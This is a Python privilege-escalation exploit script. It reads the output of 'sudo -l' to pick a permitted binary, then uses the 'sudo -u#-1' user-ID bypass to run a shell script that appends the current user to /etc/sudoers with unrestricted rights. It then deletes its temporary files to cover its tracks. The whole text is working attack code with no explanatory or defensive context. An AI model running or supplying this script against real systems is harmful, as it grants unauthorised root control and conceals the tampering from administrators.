#!/usr/bin/python3
import os

# Get current username
username = os.environ.get("USER")

# check which binary the user can run with sudo
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary = binary_file.read()

# execute sudo exploit
with open("cmd.sh", "w") as f:
    f.write(f"echo '{username} ALL=(ALL:ALL) ALL' >> /etc/sudoers\n")
    f.write("echo 'Command executed successfully'\n")

os.system("chmod +x cmd.sh")
os.system(f"echo './cmd.sh' | sudo -u#-1 {binary}")

# Clean up temporary files
os.system("rm priv binary cmd.sh")
